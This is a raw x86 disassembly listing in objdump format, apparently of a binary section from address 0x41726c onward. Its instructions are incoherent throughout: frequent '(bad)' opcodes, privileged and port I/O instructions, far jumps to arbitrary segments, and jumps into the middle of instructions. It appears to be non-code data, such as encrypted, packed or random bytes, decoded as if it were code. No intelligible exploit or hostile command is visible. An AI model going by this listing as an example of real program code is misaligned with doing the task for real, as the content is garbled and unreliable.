  41726c:	and    al,0x20
  41726e:	shr    DWORD PTR [edi-0x55],0xc5
  417272:	imul   esp,edx,0x2cd88d58
  417278:	push   esi
  417279:	xchg   esi,eax
  41727a:	inc    esi
  41727b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41727c:	pushf  
  41727d:	or     BYTE PTR ss:[esi-0x2e],ch
  417281:	add    BYTE PTR [edx+0x4e],ch
  417284:	sbb    eax,0xa4d8382d
  417289:	into   
  41728a:	cli    
  41728b:	inc    ecx
  41728c:	adc    eax,0xed2efe9f
  417291:	mov    ebx,0x3894cec7
  417296:	push   ss
  417297:	sbb    al,0xe7
  417299:	js     0x41725d
  41729b:	or     edx,esi
  41729d:	cmp    BYTE PTR [edx],al
  41729f:	push   esi
  4172a0:	ja     0x417276
  4172a2:	mov    ebx,DWORD PTR [edx-0x2e]
  4172a5:	daa    
  4172a6:	(bad)  
  4172a7:	in     eax,0x6a
  4172a9:	aaa    
  4172aa:	or     BYTE PTR [eax+0x2],dl
  4172ad:	push   ds
  4172ae:	daa    
  4172af:	in     al,dx
  4172b0:	pop    eax
  4172b1:	mov    dh,0xe6
  4172b3:	mov    dl,0xfa
  4172b5:	adc    DWORD PTR [edx-0x74872f65],edi
  4172bb:	push   0xd9f803ab
  4172c0:	mov    ch,0x3d
  4172c2:	aam    0xba
  4172c4:	in     eax,0x74
  4172c6:	mov    WORD PTR [ecx+0x3a],cs
  4172c9:	mov    BYTE PTR [ebp+0x40],bh
  4172cc:	mov    ds:0x73b337cc,eax
  4172d1:	mov    DWORD PTR [esi+0x703fbe78],edx
  4172d7:	sahf   
  4172d8:	pop    esi
  4172d9:	imul   eax,DWORD PTR [eax+0x239984e7],0x9ea75368
  4172e3:	ins    BYTE PTR es:[edi],dx
  4172e4:	ins    BYTE PTR es:[edi],dx
  4172e5:	cmp    BYTE PTR ds:0x88be7978,0x85
  4172ec:	int    0xc2
  4172ee:	mov    cl,0xe6
  4172f0:	cs loope 0x41730d
  4172f3:	add    eax,0x9fb2f251
  4172f8:	sub    DWORD PTR [esi-0x423125e5],edi
  4172fe:	pushf  
  4172ff:	sbb    al,0x70
  417301:	mov    ah,0xed
  417303:	ficomp WORD PTR [eax]
  417305:	fsubp  st(6),st
  417307:	add    DWORD PTR [esi-0x551fa0c5],esi
  41730d:	(bad)  
  41730e:	cdq    
  41730f:	retf   0x64e9
  417312:	mov    BYTE PTR [edi],al
  417314:	sti    
  417315:	dec    ebx
  417316:	xchg   BYTE PTR fs:[eax-0x5f],ah
  41731a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41731b:	and    eax,0xa58e663e
  417320:	push   ebp
  417321:	je     0x4172b8
  417323:	add    eax,0x51
  417326:	mov    dh,0xa1
  417328:	jmp    0x4172ca
  41732a:	retf   0xdb3f
  41732d:	hlt    
  41732e:	jl     0x417398
  417330:	push   ecx
  417331:	jmp    0x1dbda
  417336:	jb     0x4172fb
  417338:	push   esp
  417339:	mov    ebp,0xeb3307f7
  41733e:	inc    esp
  41733f:	es jbe 0x417302
  417342:	arpl   WORD PTR [ebp+0x5a],si
  417345:	cmp    cl,BYTE PTR ds:0x84f646df
  41734b:	addr16 fucomip st,st(2)
  41734e:	fld    DWORD PTR ds:0xc983bde7
  417354:	cli    
  417355:	int3   
  417356:	(bad)  
  417358:	sub    edx,DWORD PTR [ecx]
  41735a:	and    eax,0xd9ad1be7
  41735f:	outs   dx,BYTE PTR ds:[esi]
  417360:	ins    DWORD PTR es:[edi],dx
  417361:	mov    ebx,0xaf101290
  417366:	leave  
  417367:	push   es
  417368:	sub    DWORD PTR es:[edx+edx*4+0x79],0xffffffd9
  41736e:	add    BYTE PTR [edi-0x7c],bl
  417371:	(bad)
  417374:	clc    
  417375:	hlt    
  417376:	pop    esi
  417377:	xor    bl,ah
  417379:	adc    BYTE PTR [ebx-0x58383e2b],al
  41737f:	jle    0x4173e7
  417381:	repz sbb dh,al
  417384:	mov    ebx,0x39e5d5a2
  417389:	sbb    dl,BYTE PTR ds:0x2375e739
  41738f:	mov    bl,0xb9
  417391:	ss mov ebx,0xcabb26b2
  417397:	loop   0x4173f6
  417399:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41739a:	cmp    dl,bl
  41739c:	and    dh,ch
  41739e:	mov    ecx,DWORD PTR ds:0x8f75f53b
  4173a4:	sub    BYTE PTR [edi+0x1ce335a7],cl
  4173aa:	mov    dl,0x75
  4173ac:	xchg   ecx,eax
  4173ad:	pushf  
  4173ae:	retf   0x19d
  4173b1:	int    0xc6
  4173b3:	popf   
  4173b4:	push   cs
  4173b5:	cmp    al,0xf7
  4173b7:	mov    dl,0x3b
  4173b9:	xor    BYTE PTR [ebp+0x3a],dl
  4173bc:	xlat   BYTE PTR ds:[ebx]
  4173bd:	pop    ecx
  4173be:	pop    ebx
  4173bf:	inc    edx
  4173c0:	aad    0x94
  4173c2:	jb     0x41736c
  4173c4:	and    al,0x5d
  4173c6:	push   0x90415333
  4173cb:	mov    eax,0xfac80559
  4173d0:	(bad)  [esi+0x2c581cb0]
  4173d6:	inc    esp
  4173d7:	sub    dl,BYTE PTR [ecx]
  4173d9:	mov    ah,BYTE PTR [edi]
  4173db:	jnp    0x417417
  4173dd:	test   DWORD PTR [edi+0x2ed00dac],0x723ea20d
  4173e7:	shl    cl,0x3d
  4173ea:	mov    BYTE PTR ds:0x14f887a2,ch
  4173f0:	into   
  4173f1:	aaa    
  4173f2:	add    al,0x7b
  4173f4:	and    al,0xf5
  4173f6:	popa   
  4173f7:	jae    0x41746a
  4173f9:	xor    DWORD PTR [ecx],esp
  4173fb:	stc    
  4173fc:	mov    esp,0x295eef03
  417401:	in     eax,0xe
  417403:	jae    0x41743e
  417405:	scas   al,BYTE PTR es:[edi]
  417406:	fistp  QWORD PTR [eax-0x66]
  417409:	int3   
  41740a:	lds    esp,FWORD PTR [ecx]
  41740c:	xchg   ebp,eax
  41740d:	xchg   esp,eax
  41740e:	in     al,dx
  41740f:	mov    eax,0xaac39bb9
  417414:	mov    edi,0x66596911
  417419:	cdq    
  41741a:	jecxz  0x417449
  41741c:	and    ch,BYTE PTR [edi]
  41741e:	out    dx,al
  41741f:	jmp    0x4028:0x9fecc927
  417426:	xor    dh,cl
  417428:	data16 loope 0x417492
  41742b:	jae    0x41740d
  41742d:	inc    eax
  41742e:	sbb    al,ah
  417430:	mov    ds:0x3a2c3150,al
  417435:	lods   eax,DWORD PTR gs:[esi]
  417437:	and    BYTE PTR [edx+0x3680acb],ah
  41743d:	inc    esp
  41743e:	or     dl,0xb
  417441:	not    DWORD PTR [ebp-0x2eb1fce7]
  417447:	jg     0x4173db
  417449:	out    dx,al
  41744a:	or     DWORD PTR [eax+0x63],edi
  41744d:	push   0x1d1d1688
  417452:	and    al,BYTE PTR [ebp+0x2c87b3bb]
  417458:	pop    eax
  417459:	or     BYTE PTR [ebp+0x111db01d],bl
  41745f:	mov    eax,ds:0xad72b45c
  417464:	stc    
  417465:	imul   esp,DWORD PTR [ecx+0x27],0xffffffc0
  417469:	xor    ebp,DWORD PTR [edx]
  41746b:	cmp    edi,edx
  41746d:	out    0x2b,eax
  41746f:	lods   al,BYTE PTR ds:[esi]
  417470:	jnp    0x4174bb
  417472:	dec    ebx
  417473:	lock cld 
  417475:	jb     0x4174c0
  417477:	dec    edx
  417478:	or     DWORD PTR [esi+0x1a],esi
  41747b:	push   ds
  41747c:	repnz mov al,0xdb
  41747f:	pop    ds
  417480:	mov    bl,0x83
  417482:	or     cl,BYTE PTR [edi+0x52]
  417485:	sub    BYTE PTR [eax-0x2e],0xea
  417489:	int    0xef
  41748b:	sub    eax,0x9faf8930
  417490:	push   0xffffff86
  417492:	(bad)  
  417493:	js     0x4174e4
  417495:	pop    ecx
  417496:	pop    ds
	...
  417513:	add    ch,dl
  417515:	and    BYTE PTR [eax-0x4],0x75
  417519:	cld    
  41751a:	(bad)  [ecx+0x32bc8e94]
  417520:	bound  ebp,QWORD PTR [ecx]
  417522:	inc    esi
  417523:	iret   
  417524:	xor    DWORD PTR [eax],ebx
  417526:	add    DWORD PTR [eax],eax
  417528:	imul   eax,DWORD PTR [edi],0x0
  41752b:	add    BYTE PTR [edi+ebp*2+0x53bc00da],ah
  417532:	je     0x417524
  417534:	mov    ds:0xe5337c28,al
  417539:	inc    eax
  41753a:	rol    BYTE PTR es:[ebx],1
  41753d:	xchg   esi,eax
  41753e:	fwait
  41753f:	(bad)  
  417540:	leave  
  417541:	sub    BYTE PTR [edi],cl
  417543:	loopne 0x417584
  417545:	call   DWORD PTR [eax-0x65]
  417548:	mov    al,0x75
  41754a:	jb     0x417535
  41754c:	push   ecx
  41754d:	dec    edx
  41754e:	rol    BYTE PTR [edi+0x33],0x1e
  417552:	mov    ds:0x874b2a70,eax
  417557:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417558:	push   esp
  417559:	mov    edi,0xb410bdfd
  41755e:	xor    DWORD PTR [eax],eax
  417560:	push   ebp
  417561:	mov    esi,cs
  417563:	mov    BYTE PTR [edi+0x7b],ch
  417566:	(bad)  
  417567:	xor    dl,BYTE PTR [eax-0x36]
  41756a:	ret    
  41756b:	mov    cl,dl
  41756d:	mov    ah,0x34
  41756f:	out    0x99,al
  417571:	lock ja 0x417522
  417574:	cmp    eax,0x682f11b0
  417579:	jmp    0xdeba0f1b
  41757e:	push   edx
  41757f:	addr16 push ecx
  417581:	pop    edx
  417582:	push   0x3733e986
  417587:	call   0x13b3:0x936fee0b
  41758e:	xchg   BYTE PTR [ebp-0x41b78ef3],dh
  417594:	pop    esi
  417595:	cmp    DWORD PTR [edi+0x1d9840b5],edi
  41759b:	xor    al,0x1d
  41759d:	pop    eax
  41759e:	jne    0x4175c6
  4175a0:	push   esp
  4175a1:	lods   eax,DWORD PTR ds:[esi]
  4175a2:	sbb    esi,DWORD PTR [ebp+0x42]
  4175a5:	cmp    eax,0x3ab665a9
  4175aa:	push   eax
  4175ab:	mov    ecx,0xf063324d
  4175b0:	popa   
  4175b1:	in     al,dx
  4175b2:	sub    dh,bl
  4175b4:	cwde   
  4175b5:	pushf  
  4175b6:	jl     0x4175f8
  4175b8:	push   es
  4175b9:	outs   dx,DWORD PTR ds:[esi]
  4175ba:	dec    edi
  4175bb:	mov    ah,0xac
  4175bd:	jnp    0x4175cf
  4175bf:	inc    ebp
  4175c0:	and    DWORD PTR [edx-0x66255dc2],ebp
  4175c6:	sbb    al,0xb4
  4175c8:	push   ss
  4175c9:	mov    esp,0x34c55985
  4175ce:	push   ebp
  4175cf:	xor    cl,ch
  4175d1:	aam    0x46
  4175d3:	(bad)  
  4175d4:	scas   al,BYTE PTR es:[edi]
  4175d5:	enter  0x7b08,0x12
  4175d9:	and    bh,bl
  4175db:	cmp    dh,BYTE PTR [ecx+0x52]
  4175de:	fnstcw WORD PTR [ebp-0x55]
  4175e1:	pop    ecx
  4175e2:	mov    eax,ds:0x4c4e02ff
  4175e7:	je     0x417569
  4175e9:	pop    esi
  4175ea:	sbb    dh,BYTE PTR [edi+ebx*8-0x6]
  4175ee:	(bad)  
  4175ef:	(bad)  
  4175f0:	clc    
  4175f1:	jp     0x4175dd
  4175f3:	push   edx
  4175f4:	cmp    eax,0x8c338a77
  4175f9:	jle    0x41759b
  4175fb:	popa   
  4175fc:	test   eax,0x48803b20
  417601:	test   BYTE PTR [ebp-0x4a4628b8],ch
  417607:	xor    al,0xa7
  417609:	(bad)  
  41760b:	inc    edx
  41760c:	mov    eax,ds:0x55065639
  417611:	cmp    DWORD PTR [ecx+eax*4],eax
  417614:	and    bh,BYTE PTR [esi+0x603b904d]
  41761a:	out    0x28,eax
  41761c:	xor    eax,0x5eda7824
  417621:	add    al,0xa4
  417623:	cli    
  417624:	inc    DWORD PTR ds:0xbe8f4ac5
  41762a:	xor    ebp,0x26
  41762d:	dec    eax
  41762e:	xchg   ecx,eax
  41762f:	xchg   ebp,eax
  417630:	into   
  417631:	xor    bh,bh
  417633:	sub    ch,bh
  417635:	add    eax,0x7e3e93d2
  41763a:	stos   DWORD PTR es:[edi],eax
  41763b:	add    eax,0xfb533bf8
  417640:	xchg   edx,eax
  417641:	jo     0x4176a9
  417643:	mov    al,ds:0x9ed5104c
  417648:	cmp    eax,0xfde7a236
  41764d:	pusha  
  41764e:	gs (bad) 
  417650:	jmp    0x4570:0xf05f9ddb
  417657:	dec    ecx
  417658:	xor    ebx,edi
  41765a:	daa    
  41765b:	popf   
  41765c:	jmp    0x41764b
  41765e:	xor    BYTE PTR [edi+0x3b78560a],ch
  417664:	adc    BYTE PTR [edx+ebx*1+0x6a],dh
  417668:	mov    dl,0xee
  41766a:	repnz loopne 0x4176b1
  41766d:	sti    
  41766e:	neg    DWORD PTR [eax-0x56588cad]
  417674:	dec    esi
  417675:	jb     0x417689
  417677:	sbb    DWORD PTR [ebx],0x7975132a
  41767d:	pop    ebp
  41767e:	shl    dh,cl
  417680:	ret    0x7dad
  417683:	mov    al,0x28
  417685:	fistp  WORD PTR [ebp+0x20407997]
  41768b:	xchg   ebp,eax
  41768c:	lods   eax,DWORD PTR ds:[esi]
  41768d:	push   esi
  41768e:	add    ebx,DWORD PTR [edx]
  417690:	cmc    
  417691:	xchg   BYTE PTR [edi+edx*1+0x1],ch
  417695:	out    0xc9,al
  417697:	mov    esi,0xaa896e80
  41769c:	into   
  41769d:	scas   al,BYTE PTR es:[edi]
  41769e:	inc    ecx
  41769f:	and    eax,0xce225854
  4176a4:	leave  
  4176a5:	stc    
  4176a6:	and    al,0xf9
  4176a8:	retf   0x9c76
  4176ab:	or     eax,0xce83374c
  4176b0:	into   
  4176b1:	cdq    
  4176b2:	ja     0x417727
  4176b4:	imul   eax,esp,0xffffffc0
  4176b7:	inc    DWORD PTR [ebx-0x4da2b648]
  4176bd:	mov    dh,0x5b
  4176bf:	or     BYTE PTR [ebx+0x12],ah
  4176c2:	js     0x417689
  4176c4:	stc    
  4176c5:	lea    edx,[edx]
  4176c7:	(bad)  
  4176c8:	xor    esp,DWORD PTR [edi-0x48]
  4176cb:	pop    es
  4176cc:	fnstenv [esi]
  4176ce:	out    dx,eax
  4176cf:	push   ds
  4176d0:	pop    edi
  4176d1:	mov    dl,0xcb
  4176d3:	dec    ebp
  4176d4:	push   edi
  4176d5:	push   edi
  4176d6:	shl    eax,cl
  4176d8:	jmp    0x85feeb39
  4176dd:	adc    bl,BYTE PTR [eax]
  4176df:	sbb    eax,0xbcdfed98
  4176e4:	pop    esp
  4176e6:	or     eax,0xb0155f0a
  4176eb:	sub    DWORD PTR [edi+0x2e869123],esp
  4176f1:	and    BYTE PTR [esi-0x63],bh
  4176f4:	adc    bl,dh
  4176f6:	push   ecx
  4176f7:	ret    0x4c19
  4176fa:	data16 jl 0x4176bd
  4176fd:	pop    edx
  4176fe:	mov    bh,0x76
  417700:	mov    dh,0xd0
  417702:	jnp    0x41772d
  417704:	(bad)  
  417705:	jno    0x41775d
  417707:	sahf   
  417708:	jne    0x4176a4
  41770a:	gs dec eax
  41770c:	out    0x4b,eax
  41770e:	aam    0x94
  417710:	fs dec ecx
  417712:	imul   ecx,DWORD PTR [ebx+0x2f],0x2
  417716:	lods   al,BYTE PTR ds:[esi]
  417717:	cli    
  417718:	mov    al,ds:0xdb7c7f7
  41771d:	clc    
  41771e:	xchg   ebx,eax
  41771f:	push   edx
  417720:	sub    al,0xc2
  417722:	(bad)  
  417724:	mov    dh,0xfb
  417726:	xor    eax,0xf46639a2
  41772b:	xor    BYTE PTR [ecx-0x15f995f3],al
  417731:	out    dx,eax
  417732:	(bad)  
  417733:	pop    ecx
  417734:	gs jb  0x41779f
  417737:	into   
  417738:	in     al,0x3
  41773a:	dec    ebx
  41773b:	add    edi,DWORD PTR [eax]
  41773d:	mov    esp,0x44d19784
  417742:	icebp  
  417743:	mov    ch,0x7
  417745:	sbb    dh,ch
  417747:	push   ecx
  417748:	mov    ds:0xc8f75b6a,al
  41774d:	aad    0x72
  41774f:	dec    ecx
  417750:	sub    BYTE PTR [edi],cl
  417752:	mov    al,0xf0
  417754:	jmp    0x41779d
  417756:	outs   dx,DWORD PTR ds:[esi]
  417757:	jp     0x417730
  417759:	cli    
  41775a:	mov    dl,BYTE PTR [esi+ebp*8-0xf]
  41775e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41775f:	not    BYTE PTR [edx+0x2755b9de]
  417765:	mov    BYTE PTR [edi],dl
  417767:	jl     0x41775b
  417769:	xlat   BYTE PTR ds:[ebx]
  41776a:	rcr    DWORD PTR [ecx-0x62],0x5d
  41776e:	inc    edi
  41776f:	or     eax,0xf129b2d7
  417774:	shl    dh,0x31
  417777:	sahf   
  417778:	jge    0x417763
  41777a:	pop    ecx
  41777b:	mov    esp,0x94aaf4e9
  417780:	cli    
  417781:	div    DWORD PTR [esp+eiz*2-0x567acb9f]
  417788:	cmp    ebx,DWORD PTR ds:0x53193a9
  41778e:	mov    esi,0xce0f260f
  417793:	sar    DWORD PTR [edx+0x8],1
  417796:	sbb    DWORD PTR [ebx+eax*4],esp
  417799:	lea    ebp,[edi+esi*4-0xa]
  41779d:	push   esi
  41779e:	mov    dh,0xa3
  4177a0:	retf   0x68ac
  4177a3:	adc    BYTE PTR [edi-0x56],bl
  4177a6:	mov    dh,bh
  4177a8:	frstor [esi+0x3]
  4177ab:	dec    ecx
  4177ac:	lea    eax,[ecx-0x1391277b]
  4177b2:	ds cmc 
  4177b4:	pop    edx
  4177b5:	and    DWORD PTR [edx+0x111b7e33],eax
  4177bb:	mov    eax,0x4ab09888
  4177c0:	adc    al,0x9a
  4177c2:	push   0x580b7eb6
  4177c7:	add    DWORD PTR [ebp-0x3a],0x28
  4177cb:	mov    ds:0x1d67a8e0,al
  4177d0:	add    DWORD PTR [bp+0x2ffe],eax
  4177d5:	xor    eax,esp
  4177d7:	rcl    DWORD PTR [ebx+0x7c],cl
  4177da:	stc    
  4177db:	pusha  
  4177dc:	lock and al,BYTE PTR [esi]
  4177df:	popa   
  4177e0:	xchg   ebp,eax
  4177e1:	cmp    ebp,DWORD PTR [eax-0x57ba6b85]
  4177e7:	xor    edi,edx
  4177e9:	push   cs
  4177ea:	dec    esi
  4177eb:	mov    ecx,0x45760feb
  4177f0:	push   cs
  4177f1:	jmp    0x7cce3650
  4177f6:	xchg   BYTE PTR [esi+0x1d],dh
  4177f9:	dec    esp
  4177fa:	xlat   BYTE PTR ds:[ebx]
  4177fb:	test   al,0xf2
  4177fd:	jmp    0xe7e92389
  417802:	sbb    eax,0x2163c28b
  417807:	push   ecx
  417808:	xor    al,BYTE PTR [ebx+esi*1]
  41780b:	mov    al,ds:0x9c70a39f
  417810:	jle    0x417793
  417812:	pop    eax
  417813:	mov    ds:0x2ee458cb,eax
  417818:	mov    edi,0xd7f975f9
  41781d:	pop    ecx
  41781e:	add    ebx,DWORD PTR [edi]
  417820:	sahf   
  417821:	aam    0x0
  417823:	mov    esi,0x9fc90e23
  417828:	jbe    0x417882
  41782a:	xchg   ebx,eax
  41782b:	pop    es
  41782c:	idiv   DWORD PTR [ecx+0x58]
  41782f:	popa   
  417830:	and    eax,0x25f6dc34
  417835:	pop    ecx
  417836:	imul   ecx,esp,0xffffff8a
  417839:	popf   
  41783a:	mov    bh,0x2d
  41783c:	mov    bl,0xd1
  41783e:	clc    
  41783f:	jbe    0x4177c5
  417841:	icebp  
  417842:	sbb    DWORD PTR [edi+0x40375a0f],ecx
  417848:	and    al,BYTE PTR [esi+ebx*8-0x3]
  41784c:	push   es
  41784d:	cmc    
  41784e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41784f:	pop    ds
  417850:	cmp    dh,bh
  417852:	mov    ecx,ecx
  417854:	mov    BYTE PTR ds:0x8ca37654,al
  41785a:	into   
  41785b:	push   es
  41785c:	fstp   TBYTE PTR [edi-0x6065420b]
  417862:	or     DWORD PTR [edi+0x5e],ebx
  417865:	scas   eax,DWORD PTR es:[edi]
  417866:	and    DWORD PTR [edx+0x68d61dc9],edi
  41786c:	xchg   esp,eax
  41786d:	call   FWORD PTR [esi-0x6e]
  417870:	jmp    0x592:0x4583335f
  417877:	sub    bh,0xf0
  41787a:	in     eax,0xf2
  41787c:	sub    eax,0x18d06172
  417881:	adc    ah,BYTE PTR ss:[eax]
  417884:	xlat   BYTE PTR ds:[ebx]
  417885:	mov    ch,0x92
  417887:	mov    ecx,0xad7fcbd5
  41788c:	rcr    BYTE PTR [eax+0x19],0x19
  417890:	mov    ah,0x37
  417892:	stos   DWORD PTR es:[edi],eax
  417893:	xor    eax,0xd3b1d3d
  417898:	jbe    0x4178e9
  41789a:	(bad)  
  41789b:	ins    DWORD PTR es:[edi],dx
  41789c:	mov    ebx,0xccaaaf1d
  4178a1:	jle    0x417876
  4178a3:	inc    eax
  4178a4:	jae    0x4178ef
  4178a6:	test   ecx,esp
  4178a8:	mov    esp,0xde00376
  4178ad:	icebp  
  4178ae:	and    eax,0xdf12f159
  4178b3:	pop    ss
  4178b4:	xor    DWORD PTR [esi+0x18],0x48
  4178b8:	and    eax,0x7d58ab0f
  4178bd:	mov    bl,0x6d
  4178bf:	mov    ebp,0x9e8b7a6d
  4178c4:	dec    edx
  4178c5:	les    esp,FWORD PTR [eax+0x5a]
  4178c8:	shl    BYTE PTR [ecx-0x7a],1
  4178cb:	loopne 0x4178af
  4178cd:	in     al,0xb0
  4178cf:	in     eax,dx
  4178d0:	xchg   BYTE PTR [ebx-0x260ed0c8],ah
  4178d6:	enter  0x85c2,0x36
  4178da:	jne    0x417863
  4178dc:	dec    edx
  4178dd:	clts   
  4178df:	inc    eax
  4178e0:	outs   dx,DWORD PTR ds:[esi]
  4178e1:	jo     0x417945
  4178e3:	std    
  4178e4:	sub    DWORD PTR [ecx-0x73],ebx
  4178e7:	retf   0xcaa9
  4178ea:	aas    
  4178eb:	sbb    ah,BYTE PTR [edi]
  4178ed:	xchg   DWORD PTR [ecx],esi
  4178ef:	in     eax,dx
  4178f0:	or     dh,BYTE PTR [ebx-0x75ccb1e5]
  4178f6:	lds    edi,FWORD PTR [edi-0x69f0d7ef]
  4178fc:	add    BYTE PTR [eax-0x17],0xd5
  417900:	pop    ecx
  417901:	dec    edi
  417902:	leave  
  417903:	lods   al,BYTE PTR ds:[esi]
  417904:	mov    ebp,0xcf03ed48
  417909:	int    0xb1
  41790b:	(bad)  
  41790c:	push   esi
  41790d:	sbb    DWORD PTR [ebx+0x2c],esi
  417910:	xor    DWORD PTR [edx+0x76],ebp
  417913:	lods   eax,DWORD PTR ds:[esi]
  417914:	xchg   ecx,eax
  417915:	fdivr  DWORD PTR [edi+0x73ae0871]
  41791b:	push   esi
  41791c:	xor    DWORD PTR [ecx+0x434f7977],0x11
  417923:	fsub   st,st(4)
  417925:	pop    esi
  417926:	mov    ds:0xaf7a70a9,al
  41792b:	repnz cmp al,BYTE PTR [ebx-0x5b]
  41792f:	mov    eax,ds:0x2c3bee52
  417934:	call   0x9d0e:0xb9519775
  41793b:	jno    0x417988
  41793d:	lea    edx,[edx-0x18eced0d]
  417943:	call   0x942ea0cc
  417948:	push   ecx
  417949:	dec    ecx
  41794a:	cmc    
  41794b:	mul    BYTE PTR [ecx+0x31]
  41794e:	popf   
  41794f:	sbb    eax,0xe935527d
  417954:	fmul   st,st(7)
  417956:	jnp    0x41793f
  417958:	into   
  417959:	push   edx
  41795a:	jnp    0x4178e3
  41795c:	movlps QWORD PTR [esi+0x76da8c97],xmm3
  417963:	(bad)  
  417964:	push   edx
  417965:	jno    0x417945
  417967:	xchg   esi,eax
  417968:	lds    esi,FWORD PTR [ecx-0x59484839]
  41796e:	xchg   DWORD PTR [ebx-0x2f7a53d2],ebx
  417974:	test   BYTE PTR [edx],dl
  417976:	xchg   ebx,eax
  417977:	jne    0x4179cf
  417979:	mov    eax,DWORD PTR [edi-0x41]
  41797c:	xlat   BYTE PTR ds:[ebx]
  41797d:	stos   DWORD PTR es:[edi],eax
  41797e:	push   ebp
  41797f:	sahf   
  417980:	push   esi
  417981:	pop    ss
  417982:	jmp    0x10f14635
  417987:	push   0xfee28b81
  41798c:	mov    bh,0x62
  41798e:	mov    cl,0x9f
  417990:	add    ch,BYTE PTR [edx]
  417992:	je     0x41793f
  417994:	dec    ebx
  417995:	(bad)  
  417996:	push   edi
  417997:	mov    bl,0xd1
  417999:	adc    ch,BYTE PTR [edx+0x5af27b96]
  41799f:	hlt    
  4179a0:	push   esi
  4179a1:	mov    ebp,0x80f94339
  4179a6:	loop   0x4179eb
  4179a8:	jecxz  0x417996
  4179aa:	cld    
  4179ab:	inc    esp
  4179ac:	icebp  
  4179ad:	jne    0x4179f4
  4179af:	or     al,0xc0
  4179b1:	les    ebp,FWORD PTR [ebp+0x15cfa71e]
  4179b7:	cwde   
  4179b8:	idiv   DWORD PTR [ecx-0x1a0c45c0]
  4179be:	push   0x3d
  4179c0:	call   0x1e311e3d
  4179c5:	ret    0x5b0a
  4179c8:	in     al,dx
  4179c9:	inc    ebx
  4179ca:	adc    ch,dh
  4179cc:	test   al,0xe4
  4179ce:	mov    esp,ebx
  4179d0:	fucomi st,st(1)
  4179d2:	dec    eax
  4179d3:	lods   al,BYTE PTR ds:[esi]
  4179d4:	adc    eax,0xf484b0a0
  4179d9:	repz js 0x417a24
  4179dc:	lods   al,BYTE PTR ds:[esi]
  4179dd:	sub    ebp,DWORD PTR [eax-0x7deb4829]
  4179e3:	dec    esp
  4179e4:	fdiv   DWORD PTR [ebp+0x2]
  4179e7:	jmp    0x4179ed
  4179e9:	jle    0x4179d9
  4179eb:	outs   dx,DWORD PTR ds:[esi]
  4179ec:	or     DWORD PTR [ecx-0x50],0xd033664f
  4179f3:	adc    dh,al
  4179f5:	cmp    DWORD PTR [esp+ecx*8+0x704a6d05],eax
  4179fc:	and    BYTE PTR [edi+eiz*8],al
  4179ff:	lahf   
  417a00:	push   eax
  417a01:	pop    ebx
  417a02:	cmc    
  417a03:	xlat   BYTE PTR ds:[ebx]
  417a04:	ret    0xf032
  417a07:	bound  esi,QWORD PTR [ebx]
  417a09:	ds pushf 
  417a0b:	and    DWORD PTR [ebx-0x57b3e0a6],0x55
  417a12:	push   es
  417a13:	sub    BYTE PTR [ebx+0x71189397],cl
  417a19:	or     ah,BYTE PTR fs:[eax+0x6]
  417a1d:	adc    eax,0x6557993f
  417a22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a23:	sti    
  417a24:	out    dx,eax
  417a25:	adc    ecx,esi
  417a27:	pop    ebp
  417a28:	mov    DWORD PTR [ecx],esp
  417a2a:	pop    es
  417a2b:	icebp  
  417a2c:	addr16 jl 0x417a93
  417a2f:	add    cl,cl
  417a31:	jge    0x4179ea
  417a33:	pop    edx
  417a34:	or     eax,0xe1b5638a
  417a39:	lahf   
  417a3a:	cmp    al,0x8a
  417a3c:	xchg   BYTE PTR [esi-0x4f],bh
  417a3f:	cmp    bl,BYTE PTR [ecx-0x2b]
  417a42:	sub    edi,edi
  417a44:	inc    edx
  417a45:	cmp    DWORD PTR [edi-0x1a7dfc59],edx
  417a4b:	ss sbb dl,bl
  417a4e:	adc    DWORD PTR [ecx+0xe015b1f],ebx
  417a54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a55:	ins    DWORD PTR es:[edi],dx
  417a56:	outs   dx,DWORD PTR ds:[esi]
  417a57:	push   ecx
  417a58:	fstp   DWORD PTR [edi-0x18843c62]
  417a5e:	inc    esi
  417a5f:	xor    DWORD PTR [eax*1-0x791fd3a2],esp
  417a66:	adc    BYTE PTR [ebx],bl
  417a68:	and    al,0x64
  417a6a:	aaa    
  417a6b:	div    DWORD PTR [ebx-0x546e5ecb]
  417a71:	lds    ebp,FWORD PTR [eax-0x6b]
  417a74:	push   ebp
  417a75:	cmp    esi,esp
  417a77:	mov    ch,0xac
  417a79:	inc    ebp
  417a7a:	pop    edi
  417a7b:	popf   
  417a7c:	jge    0x417ab2
  417a7e:	or     ebp,eax
  417a80:	sbb    edi,DWORD PTR [eax]
  417a82:	push   edi
  417a83:	jmp    0xc39a:0x23670441
  417a8a:	shr    BYTE PTR [edi],cl
  417a8c:	cmp    dl,BYTE PTR [ecx]
  417a8e:	mov    ebx,0x2b9ad12b
  417a93:	cli    
  417a94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a95:	jle    0x417ae3
  417a97:	(bad)  
  417a98:	lods   eax,DWORD PTR ds:[esi]
  417a99:	stos   DWORD PTR es:[edi],eax
  417a9a:	inc    edi
  417a9b:	lds    esi,FWORD PTR [ecx+edx*8]
  417a9e:	stos   BYTE PTR es:[edi],al
  417a9f:	pop    ebp
  417aa0:	jmp    0x417a87
  417aa2:	or     eax,DWORD PTR [ecx]
  417aa4:	fdivr  DWORD PTR [ecx+eiz*2+0x26b3617d]
  417aab:	mov    DWORD PTR [edx],0x24648ad4
  417ab1:	outs   dx,BYTE PTR ds:[esi]
  417ab2:	jge    0x417a5b
  417ab4:	jnp    0x417ae3
  417ab6:	xlat   BYTE PTR ds:[ebx]
  417ab7:	into   
  417ab8:	mov    bl,0xf3
  417aba:	clc    
  417abb:	dec    esi
  417abc:	pop    ecx
  417abd:	sub    eax,0x3fc2c595
  417ac2:	stos   DWORD PTR es:[edi],eax
  417ac3:	mov    cl,0xe9
  417ac5:	in     eax,dx
  417ac6:	xchg   edx,eax
  417ac7:	jne    0x417a90
  417ac9:	add    bl,BYTE PTR [ecx]
  417acb:	and    eax,0xf9e0b0bf
  417ad0:	sub    edi,DWORD PTR ds:0xb140f6fe
  417ad6:	jp     0x417a5b
  417ad8:	mov    ch,0xfa
  417ada:	pop    esi
